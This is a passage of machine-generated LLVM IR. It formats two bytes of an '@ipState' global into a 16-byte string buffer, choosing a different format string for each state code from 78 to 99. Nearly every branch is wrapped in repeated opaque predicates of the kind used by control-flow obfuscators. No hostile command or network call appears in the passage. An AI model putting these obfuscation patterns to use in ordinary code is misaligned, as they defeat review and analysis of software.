  %1459 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1460 = zext i8 %1459 to i32
  %1461 = call i32 (i8*, i8*, ...) @szprintf(i8* %1456, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.748, i32 0, i32 0), i32 %1458, i32 %1460)
  br label %1462

; <label>:1462:                                   ; preds = %1455, %1452
  %1463 = load i32, i32* %1, align 4
  %1464 = icmp eq i32 %1463, 78
  br i1 %1464, label %1465, label %1472

; <label>:1465:                                   ; preds = %1462
  %1466 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1467 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1468 = zext i8 %1467 to i32
  %1469 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1470 = zext i8 %1469 to i32
  %1471 = call i32 (i8*, i8*, ...) @szprintf(i8* %1466, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.749, i32 0, i32 0), i32 %1468, i32 %1470)
  br label %1472

; <label>:1472:                                   ; preds = %1465, %1462
  %1473 = load i32, i32* %1, align 4
  %1474 = icmp eq i32 %1473, 79
  br i1 %1474, label %1475, label %1482

; <label>:1475:                                   ; preds = %1472
  %1476 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1477 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1478 = zext i8 %1477 to i32
  %1479 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1480 = zext i8 %1479 to i32
  %1481 = call i32 (i8*, i8*, ...) @szprintf(i8* %1476, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.750, i32 0, i32 0), i32 %1478, i32 %1480)
  br label %1482

; <label>:1482:                                   ; preds = %1475, %1472
  %1483 = load i32, i32* @x.65
  %1484 = load i32, i32* @y.66
  %1485 = sub i32 %1483, 1
  %1486 = mul i32 %1483, %1485
  %1487 = urem i32 %1486, 2
  %1488 = icmp eq i32 %1487, 0
  %1489 = icmp slt i32 %1484, 10
  %1490 = or i1 %1488, %1489
  br i1 %1490, label %originalBB162, label %originalBB162alteredBB

originalBB162:                                    ; preds = %originalBB162alteredBB, %1482
  %1491 = load i32, i32* %1, align 4
  %1492 = icmp eq i32 %1491, 80
  %1493 = load i32, i32* @x.65
  %1494 = load i32, i32* @y.66
  %1495 = sub i32 %1493, 1
  %1496 = mul i32 %1493, %1495
  %1497 = urem i32 %1496, 2
  %1498 = icmp eq i32 %1497, 0
  %1499 = icmp slt i32 %1494, 10
  %1500 = or i1 %1498, %1499
  br i1 %1500, label %originalBBpart2164, label %originalBB162alteredBB

originalBBpart2164:                               ; preds = %originalBB162
  br i1 %1492, label %1501, label %1508

; <label>:1501:                                   ; preds = %originalBBpart2164
  %1502 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1503 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1504 = zext i8 %1503 to i32
  %1505 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1506 = zext i8 %1505 to i32
  %1507 = call i32 (i8*, i8*, ...) @szprintf(i8* %1502, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.751, i32 0, i32 0), i32 %1504, i32 %1506)
  br label %1508

; <label>:1508:                                   ; preds = %1501, %originalBBpart2164
  %1509 = load i32, i32* %1, align 4
  %1510 = icmp eq i32 %1509, 81
  br i1 %1510, label %1511, label %1534

; <label>:1511:                                   ; preds = %1508
  %1512 = load i32, i32* @x.65
  %1513 = load i32, i32* @y.66
  %1514 = sub i32 %1512, 1
  %1515 = mul i32 %1512, %1514
  %1516 = urem i32 %1515, 2
  %1517 = icmp eq i32 %1516, 0
  %1518 = icmp slt i32 %1513, 10
  %1519 = or i1 %1517, %1518
  br i1 %1519, label %originalBB166, label %originalBB166alteredBB

originalBB166:                                    ; preds = %originalBB166alteredBB, %1511
  %1520 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1521 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1522 = zext i8 %1521 to i32
  %1523 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1524 = zext i8 %1523 to i32
  %1525 = call i32 (i8*, i8*, ...) @szprintf(i8* %1520, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.752, i32 0, i32 0), i32 %1522, i32 %1524)
  %1526 = load i32, i32* @x.65
  %1527 = load i32, i32* @y.66
  %1528 = sub i32 %1526, 1
  %1529 = mul i32 %1526, %1528
  %1530 = urem i32 %1529, 2
  %1531 = icmp eq i32 %1530, 0
  %1532 = icmp slt i32 %1527, 10
  %1533 = or i1 %1531, %1532
  br i1 %1533, label %originalBBpart2168, label %originalBB166alteredBB

originalBBpart2168:                               ; preds = %originalBB166
  br label %1534

; <label>:1534:                                   ; preds = %originalBBpart2168, %1508
  %1535 = load i32, i32* %1, align 4
  %1536 = icmp eq i32 %1535, 82
  br i1 %1536, label %1537, label %1544

; <label>:1537:                                   ; preds = %1534
  %1538 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1539 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1540 = zext i8 %1539 to i32
  %1541 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1542 = zext i8 %1541 to i32
  %1543 = call i32 (i8*, i8*, ...) @szprintf(i8* %1538, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.753, i32 0, i32 0), i32 %1540, i32 %1542)
  br label %1544

; <label>:1544:                                   ; preds = %1537, %1534
  %1545 = load i32, i32* %1, align 4
  %1546 = icmp eq i32 %1545, 83
  br i1 %1546, label %1547, label %1554

; <label>:1547:                                   ; preds = %1544
  %1548 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1549 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1550 = zext i8 %1549 to i32
  %1551 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1552 = zext i8 %1551 to i32
  %1553 = call i32 (i8*, i8*, ...) @szprintf(i8* %1548, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.754, i32 0, i32 0), i32 %1550, i32 %1552)
  br label %1554

; <label>:1554:                                   ; preds = %1547, %1544
  %1555 = load i32, i32* %1, align 4
  %1556 = icmp eq i32 %1555, 84
  br i1 %1556, label %1557, label %1564

; <label>:1557:                                   ; preds = %1554
  %1558 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1559 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1560 = zext i8 %1559 to i32
  %1561 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1562 = zext i8 %1561 to i32
  %1563 = call i32 (i8*, i8*, ...) @szprintf(i8* %1558, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.755, i32 0, i32 0), i32 %1560, i32 %1562)
  br label %1564

; <label>:1564:                                   ; preds = %1557, %1554
  %1565 = load i32, i32* %1, align 4
  %1566 = icmp eq i32 %1565, 85
  br i1 %1566, label %1567, label %1590

; <label>:1567:                                   ; preds = %1564
  %1568 = load i32, i32* @x.65
  %1569 = load i32, i32* @y.66
  %1570 = sub i32 %1568, 1
  %1571 = mul i32 %1568, %1570
  %1572 = urem i32 %1571, 2
  %1573 = icmp eq i32 %1572, 0
  %1574 = icmp slt i32 %1569, 10
  %1575 = or i1 %1573, %1574
  br i1 %1575, label %originalBB170, label %originalBB170alteredBB

originalBB170:                                    ; preds = %originalBB170alteredBB, %1567
  %1576 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1577 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1578 = zext i8 %1577 to i32
  %1579 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1580 = zext i8 %1579 to i32
  %1581 = call i32 (i8*, i8*, ...) @szprintf(i8* %1576, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.756, i32 0, i32 0), i32 %1578, i32 %1580)
  %1582 = load i32, i32* @x.65
  %1583 = load i32, i32* @y.66
  %1584 = sub i32 %1582, 1
  %1585 = mul i32 %1582, %1584
  %1586 = urem i32 %1585, 2
  %1587 = icmp eq i32 %1586, 0
  %1588 = icmp slt i32 %1583, 10
  %1589 = or i1 %1587, %1588
  br i1 %1589, label %originalBBpart2172, label %originalBB170alteredBB

originalBBpart2172:                               ; preds = %originalBB170
  br label %1590

; <label>:1590:                                   ; preds = %originalBBpart2172, %1564
  %1591 = load i32, i32* @x.65
  %1592 = load i32, i32* @y.66
  %1593 = sub i32 %1591, 1
  %1594 = mul i32 %1591, %1593
  %1595 = urem i32 %1594, 2
  %1596 = icmp eq i32 %1595, 0
  %1597 = icmp slt i32 %1592, 10
  %1598 = or i1 %1596, %1597
  br i1 %1598, label %originalBB174, label %originalBB174alteredBB

originalBB174:                                    ; preds = %originalBB174alteredBB, %1590
  %1599 = load i32, i32* %1, align 4
  %1600 = icmp eq i32 %1599, 86
  %1601 = load i32, i32* @x.65
  %1602 = load i32, i32* @y.66
  %1603 = sub i32 %1601, 1
  %1604 = mul i32 %1601, %1603
  %1605 = urem i32 %1604, 2
  %1606 = icmp eq i32 %1605, 0
  %1607 = icmp slt i32 %1602, 10
  %1608 = or i1 %1606, %1607
  br i1 %1608, label %originalBBpart2176, label %originalBB174alteredBB

originalBBpart2176:                               ; preds = %originalBB174
  br i1 %1600, label %1609, label %1616

; <label>:1609:                                   ; preds = %originalBBpart2176
  %1610 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1611 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1612 = zext i8 %1611 to i32
  %1613 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1614 = zext i8 %1613 to i32
  %1615 = call i32 (i8*, i8*, ...) @szprintf(i8* %1610, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.757, i32 0, i32 0), i32 %1612, i32 %1614)
  br label %1616

; <label>:1616:                                   ; preds = %1609, %originalBBpart2176
  %1617 = load i32, i32* @x.65
  %1618 = load i32, i32* @y.66
  %1619 = sub i32 %1617, 1
  %1620 = mul i32 %1617, %1619
  %1621 = urem i32 %1620, 2
  %1622 = icmp eq i32 %1621, 0
  %1623 = icmp slt i32 %1618, 10
  %1624 = or i1 %1622, %1623
  br i1 %1624, label %originalBB178, label %originalBB178alteredBB

originalBB178:                                    ; preds = %originalBB178alteredBB, %1616
  %1625 = load i32, i32* %1, align 4
  %1626 = icmp eq i32 %1625, 87
  %1627 = load i32, i32* @x.65
  %1628 = load i32, i32* @y.66
  %1629 = sub i32 %1627, 1
  %1630 = mul i32 %1627, %1629
  %1631 = urem i32 %1630, 2
  %1632 = icmp eq i32 %1631, 0
  %1633 = icmp slt i32 %1628, 10
  %1634 = or i1 %1632, %1633
  br i1 %1634, label %originalBBpart2180, label %originalBB178alteredBB

originalBBpart2180:                               ; preds = %originalBB178
  br i1 %1626, label %1635, label %1642

; <label>:1635:                                   ; preds = %originalBBpart2180
  %1636 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1637 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1638 = zext i8 %1637 to i32
  %1639 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1640 = zext i8 %1639 to i32
  %1641 = call i32 (i8*, i8*, ...) @szprintf(i8* %1636, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.758, i32 0, i32 0), i32 %1638, i32 %1640)
  br label %1642

; <label>:1642:                                   ; preds = %1635, %originalBBpart2180
  %1643 = load i32, i32* %1, align 4
  %1644 = icmp eq i32 %1643, 88
  br i1 %1644, label %1645, label %1652

; <label>:1645:                                   ; preds = %1642
  %1646 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1647 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1648 = zext i8 %1647 to i32
  %1649 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1650 = zext i8 %1649 to i32
  %1651 = call i32 (i8*, i8*, ...) @szprintf(i8* %1646, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.759, i32 0, i32 0), i32 %1648, i32 %1650)
  br label %1652

; <label>:1652:                                   ; preds = %1645, %1642
  %1653 = load i32, i32* @x.65
  %1654 = load i32, i32* @y.66
  %1655 = sub i32 %1653, 1
  %1656 = mul i32 %1653, %1655
  %1657 = urem i32 %1656, 2
  %1658 = icmp eq i32 %1657, 0
  %1659 = icmp slt i32 %1654, 10
  %1660 = or i1 %1658, %1659
  br i1 %1660, label %originalBB182, label %originalBB182alteredBB

originalBB182:                                    ; preds = %originalBB182alteredBB, %1652
  %1661 = load i32, i32* %1, align 4
  %1662 = icmp eq i32 %1661, 89
  %1663 = load i32, i32* @x.65
  %1664 = load i32, i32* @y.66
  %1665 = sub i32 %1663, 1
  %1666 = mul i32 %1663, %1665
  %1667 = urem i32 %1666, 2
  %1668 = icmp eq i32 %1667, 0
  %1669 = icmp slt i32 %1664, 10
  %1670 = or i1 %1668, %1669
  br i1 %1670, label %originalBBpart2184, label %originalBB182alteredBB

originalBBpart2184:                               ; preds = %originalBB182
  br i1 %1662, label %1671, label %1678

; <label>:1671:                                   ; preds = %originalBBpart2184
  %1672 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1673 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1674 = zext i8 %1673 to i32
  %1675 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1676 = zext i8 %1675 to i32
  %1677 = call i32 (i8*, i8*, ...) @szprintf(i8* %1672, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.760, i32 0, i32 0), i32 %1674, i32 %1676)
  br label %1678

; <label>:1678:                                   ; preds = %1671, %originalBBpart2184
  %1679 = load i32, i32* @x.65
  %1680 = load i32, i32* @y.66
  %1681 = sub i32 %1679, 1
  %1682 = mul i32 %1679, %1681
  %1683 = urem i32 %1682, 2
  %1684 = icmp eq i32 %1683, 0
  %1685 = icmp slt i32 %1680, 10
  %1686 = or i1 %1684, %1685
  br i1 %1686, label %originalBB186, label %originalBB186alteredBB

originalBB186:                                    ; preds = %originalBB186alteredBB, %1678
  %1687 = load i32, i32* %1, align 4
  %1688 = icmp eq i32 %1687, 90
  %1689 = load i32, i32* @x.65
  %1690 = load i32, i32* @y.66
  %1691 = sub i32 %1689, 1
  %1692 = mul i32 %1689, %1691
  %1693 = urem i32 %1692, 2
  %1694 = icmp eq i32 %1693, 0
  %1695 = icmp slt i32 %1690, 10
  %1696 = or i1 %1694, %1695
  br i1 %1696, label %originalBBpart2188, label %originalBB186alteredBB

originalBBpart2188:                               ; preds = %originalBB186
  br i1 %1688, label %1697, label %1720

; <label>:1697:                                   ; preds = %originalBBpart2188
  %1698 = load i32, i32* @x.65
  %1699 = load i32, i32* @y.66
  %1700 = sub i32 %1698, 1
  %1701 = mul i32 %1698, %1700
  %1702 = urem i32 %1701, 2
  %1703 = icmp eq i32 %1702, 0
  %1704 = icmp slt i32 %1699, 10
  %1705 = or i1 %1703, %1704
  br i1 %1705, label %originalBB190, label %originalBB190alteredBB

originalBB190:                                    ; preds = %originalBB190alteredBB, %1697
  %1706 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1707 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1708 = zext i8 %1707 to i32
  %1709 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1710 = zext i8 %1709 to i32
  %1711 = call i32 (i8*, i8*, ...) @szprintf(i8* %1706, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.761, i32 0, i32 0), i32 %1708, i32 %1710)
  %1712 = load i32, i32* @x.65
  %1713 = load i32, i32* @y.66
  %1714 = sub i32 %1712, 1
  %1715 = mul i32 %1712, %1714
  %1716 = urem i32 %1715, 2
  %1717 = icmp eq i32 %1716, 0
  %1718 = icmp slt i32 %1713, 10
  %1719 = or i1 %1717, %1718
  br i1 %1719, label %originalBBpart2192, label %originalBB190alteredBB

originalBBpart2192:                               ; preds = %originalBB190
  br label %1720

; <label>:1720:                                   ; preds = %originalBBpart2192, %originalBBpart2188
  %1721 = load i32, i32* %1, align 4
  %1722 = icmp eq i32 %1721, 91
  br i1 %1722, label %1723, label %1746

; <label>:1723:                                   ; preds = %1720
  %1724 = load i32, i32* @x.65
  %1725 = load i32, i32* @y.66
  %1726 = sub i32 %1724, 1
  %1727 = mul i32 %1724, %1726
  %1728 = urem i32 %1727, 2
  %1729 = icmp eq i32 %1728, 0
  %1730 = icmp slt i32 %1725, 10
  %1731 = or i1 %1729, %1730
  br i1 %1731, label %originalBB194, label %originalBB194alteredBB

originalBB194:                                    ; preds = %originalBB194alteredBB, %1723
  %1732 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1733 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1734 = zext i8 %1733 to i32
  %1735 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1736 = zext i8 %1735 to i32
  %1737 = call i32 (i8*, i8*, ...) @szprintf(i8* %1732, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.762, i32 0, i32 0), i32 %1734, i32 %1736)
  %1738 = load i32, i32* @x.65
  %1739 = load i32, i32* @y.66
  %1740 = sub i32 %1738, 1
  %1741 = mul i32 %1738, %1740
  %1742 = urem i32 %1741, 2
  %1743 = icmp eq i32 %1742, 0
  %1744 = icmp slt i32 %1739, 10
  %1745 = or i1 %1743, %1744
  br i1 %1745, label %originalBBpart2196, label %originalBB194alteredBB

originalBBpart2196:                               ; preds = %originalBB194
  br label %1746

; <label>:1746:                                   ; preds = %originalBBpart2196, %1720
  %1747 = load i32, i32* %1, align 4
  %1748 = icmp eq i32 %1747, 92
  br i1 %1748, label %1749, label %1756

; <label>:1749:                                   ; preds = %1746
  %1750 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1751 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1752 = zext i8 %1751 to i32
  %1753 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1754 = zext i8 %1753 to i32
  %1755 = call i32 (i8*, i8*, ...) @szprintf(i8* %1750, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.763, i32 0, i32 0), i32 %1752, i32 %1754)
  br label %1756

; <label>:1756:                                   ; preds = %1749, %1746
  %1757 = load i32, i32* %1, align 4
  %1758 = icmp eq i32 %1757, 93
  br i1 %1758, label %1759, label %1782

; <label>:1759:                                   ; preds = %1756
  %1760 = load i32, i32* @x.65
  %1761 = load i32, i32* @y.66
  %1762 = sub i32 %1760, 1
  %1763 = mul i32 %1760, %1762
  %1764 = urem i32 %1763, 2
  %1765 = icmp eq i32 %1764, 0
  %1766 = icmp slt i32 %1761, 10
  %1767 = or i1 %1765, %1766
  br i1 %1767, label %originalBB198, label %originalBB198alteredBB

originalBB198:                                    ; preds = %originalBB198alteredBB, %1759
  %1768 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1769 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1770 = zext i8 %1769 to i32
  %1771 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1772 = zext i8 %1771 to i32
  %1773 = call i32 (i8*, i8*, ...) @szprintf(i8* %1768, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.752, i32 0, i32 0), i32 %1770, i32 %1772)
  %1774 = load i32, i32* @x.65
  %1775 = load i32, i32* @y.66
  %1776 = sub i32 %1774, 1
  %1777 = mul i32 %1774, %1776
  %1778 = urem i32 %1777, 2
  %1779 = icmp eq i32 %1778, 0
  %1780 = icmp slt i32 %1775, 10
  %1781 = or i1 %1779, %1780
  br i1 %1781, label %originalBBpart2200, label %originalBB198alteredBB

originalBBpart2200:                               ; preds = %originalBB198
  br label %1782

; <label>:1782:                                   ; preds = %originalBBpart2200, %1756
  %1783 = load i32, i32* %1, align 4
  %1784 = icmp eq i32 %1783, 94
  br i1 %1784, label %1785, label %1808

; <label>:1785:                                   ; preds = %1782
  %1786 = load i32, i32* @x.65
  %1787 = load i32, i32* @y.66
  %1788 = sub i32 %1786, 1
  %1789 = mul i32 %1786, %1788
  %1790 = urem i32 %1789, 2
  %1791 = icmp eq i32 %1790, 0
  %1792 = icmp slt i32 %1787, 10
  %1793 = or i1 %1791, %1792
  br i1 %1793, label %originalBB202, label %originalBB202alteredBB

originalBB202:                                    ; preds = %originalBB202alteredBB, %1785
  %1794 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1795 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1796 = zext i8 %1795 to i32
  %1797 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1798 = zext i8 %1797 to i32
  %1799 = call i32 (i8*, i8*, ...) @szprintf(i8* %1794, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.764, i32 0, i32 0), i32 %1796, i32 %1798)
  %1800 = load i32, i32* @x.65
  %1801 = load i32, i32* @y.66
  %1802 = sub i32 %1800, 1
  %1803 = mul i32 %1800, %1802
  %1804 = urem i32 %1803, 2
  %1805 = icmp eq i32 %1804, 0
  %1806 = icmp slt i32 %1801, 10
  %1807 = or i1 %1805, %1806
  br i1 %1807, label %originalBBpart2204, label %originalBB202alteredBB

originalBBpart2204:                               ; preds = %originalBB202
  br label %1808

; <label>:1808:                                   ; preds = %originalBBpart2204, %1782
  %1809 = load i32, i32* %1, align 4
  %1810 = icmp eq i32 %1809, 95
  br i1 %1810, label %1811, label %1818

; <label>:1811:                                   ; preds = %1808
  %1812 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1813 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1814 = zext i8 %1813 to i32
  %1815 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1816 = zext i8 %1815 to i32
  %1817 = call i32 (i8*, i8*, ...) @szprintf(i8* %1812, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.765, i32 0, i32 0), i32 %1814, i32 %1816)
  br label %1818

; <label>:1818:                                   ; preds = %1811, %1808
  %1819 = load i32, i32* %1, align 4
  %1820 = icmp eq i32 %1819, 96
  br i1 %1820, label %1821, label %1844

; <label>:1821:                                   ; preds = %1818
  %1822 = load i32, i32* @x.65
  %1823 = load i32, i32* @y.66
  %1824 = sub i32 %1822, 1
  %1825 = mul i32 %1822, %1824
  %1826 = urem i32 %1825, 2
  %1827 = icmp eq i32 %1826, 0
  %1828 = icmp slt i32 %1823, 10
  %1829 = or i1 %1827, %1828
  br i1 %1829, label %originalBB206, label %originalBB206alteredBB

originalBB206:                                    ; preds = %originalBB206alteredBB, %1821
  %1830 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1831 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1832 = zext i8 %1831 to i32
  %1833 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1834 = zext i8 %1833 to i32
  %1835 = call i32 (i8*, i8*, ...) @szprintf(i8* %1830, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.766, i32 0, i32 0), i32 %1832, i32 %1834)
  %1836 = load i32, i32* @x.65
  %1837 = load i32, i32* @y.66
  %1838 = sub i32 %1836, 1
  %1839 = mul i32 %1836, %1838
  %1840 = urem i32 %1839, 2
  %1841 = icmp eq i32 %1840, 0
  %1842 = icmp slt i32 %1837, 10
  %1843 = or i1 %1841, %1842
  br i1 %1843, label %originalBBpart2208, label %originalBB206alteredBB

originalBBpart2208:                               ; preds = %originalBB206
  br label %1844

; <label>:1844:                                   ; preds = %originalBBpart2208, %1818
  %1845 = load i32, i32* %1, align 4
  %1846 = icmp eq i32 %1845, 97
  br i1 %1846, label %1847, label %1870

; <label>:1847:                                   ; preds = %1844
  %1848 = load i32, i32* @x.65
  %1849 = load i32, i32* @y.66
  %1850 = sub i32 %1848, 1
  %1851 = mul i32 %1848, %1850
  %1852 = urem i32 %1851, 2
  %1853 = icmp eq i32 %1852, 0
  %1854 = icmp slt i32 %1849, 10
  %1855 = or i1 %1853, %1854
  br i1 %1855, label %originalBB210, label %originalBB210alteredBB

originalBB210:                                    ; preds = %originalBB210alteredBB, %1847
  %1856 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1857 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1858 = zext i8 %1857 to i32
  %1859 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1860 = zext i8 %1859 to i32
  %1861 = call i32 (i8*, i8*, ...) @szprintf(i8* %1856, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.765, i32 0, i32 0), i32 %1858, i32 %1860)
  %1862 = load i32, i32* @x.65
  %1863 = load i32, i32* @y.66
  %1864 = sub i32 %1862, 1
  %1865 = mul i32 %1862, %1864
  %1866 = urem i32 %1865, 2
  %1867 = icmp eq i32 %1866, 0
  %1868 = icmp slt i32 %1863, 10
  %1869 = or i1 %1867, %1868
  br i1 %1869, label %originalBBpart2212, label %originalBB210alteredBB

originalBBpart2212:                               ; preds = %originalBB210
  br label %1870

; <label>:1870:                                   ; preds = %originalBBpart2212, %1844
  %1871 = load i32, i32* @x.65
  %1872 = load i32, i32* @y.66
  %1873 = sub i32 %1871, 1
  %1874 = mul i32 %1871, %1873
  %1875 = urem i32 %1874, 2
  %1876 = icmp eq i32 %1875, 0
  %1877 = icmp slt i32 %1872, 10
  %1878 = or i1 %1876, %1877
  br i1 %1878, label %originalBB214, label %originalBB214alteredBB

originalBB214:                                    ; preds = %originalBB214alteredBB, %1870
  %1879 = load i32, i32* %1, align 4
  %1880 = icmp eq i32 %1879, 98
  %1881 = load i32, i32* @x.65
  %1882 = load i32, i32* @y.66
  %1883 = sub i32 %1881, 1
  %1884 = mul i32 %1881, %1883
  %1885 = urem i32 %1884, 2
  %1886 = icmp eq i32 %1885, 0
  %1887 = icmp slt i32 %1882, 10
  %1888 = or i1 %1886, %1887
  br i1 %1888, label %originalBBpart2216, label %originalBB214alteredBB

originalBBpart2216:                               ; preds = %originalBB214
  br i1 %1880, label %1889, label %1896

; <label>:1889:                                   ; preds = %originalBBpart2216
  %1890 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1891 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1892 = zext i8 %1891 to i32
  %1893 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1894 = zext i8 %1893 to i32
  %1895 = call i32 (i8*, i8*, ...) @szprintf(i8* %1890, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.767, i32 0, i32 0), i32 %1892, i32 %1894)
  br label %1896

; <label>:1896:                                   ; preds = %1889, %originalBBpart2216
  %1897 = load i32, i32* %1, align 4
  %1898 = icmp eq i32 %1897, 99
  br i1 %1898, label %1899, label %1922

; <label>:1899:                                   ; preds = %1896
  %1900 = load i32, i32* @x.65
  %1901 = load i32, i32* @y.66
  %1902 = sub i32 %1900, 1
  %1903 = mul i32 %1900, %1902
  %1904 = urem i32 %1903, 2
  %1905 = icmp eq i32 %1904, 0
  %1906 = icmp slt i32 %1901, 10
  %1907 = or i1 %1905, %1906
  br i1 %1907, label %originalBB218, label %originalBB218alteredBB

originalBB218:                                    ; preds = %originalBB218alteredBB, %1899
  %1908 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1909 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1910 = zext i8 %1909 to i32
